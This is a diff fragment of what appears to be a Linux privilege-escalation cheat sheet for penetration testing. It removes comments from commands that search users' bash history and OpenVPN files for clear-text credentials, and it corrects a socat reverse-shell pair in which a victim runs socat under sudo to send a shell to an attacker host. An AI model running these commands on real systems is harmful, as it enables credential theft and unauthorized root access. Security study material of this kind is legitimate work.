@@ -39,16 +39,16 @@ locate pass | more
 # Bash History
 Structure : Linux Command // <Comment / Tip>
 ```
-history                             // Any clear-text credentials? Any command for logging into services with the credentials?
-cat /home/<user>/.bash_history      // Can we see CLI history of other users?
-cat ~/.bash_history | grep -i passw // Any clear-text credentials?
+history                            
+cat /home/<user>/.bash_history     
+cat ~/.bash_history | grep -i passw 
 
 ```
 
 # OpenVPN Credentials
 Structure : Linux Command // <Comment / Tip>
 ```
-locate *.ovpn                       // Any OpenVPN files with clear-text credentials?
+locate *.ovpn                       
 
 ```
 
@@ -229,7 +229,7 @@ sudo ftp - ! /bin/bash
 
 socat
 ```
-Attacker = Attacker= socat file:`tty`,raw,echo=0 tcp-listen:1234
+Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
 Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
 ```
 
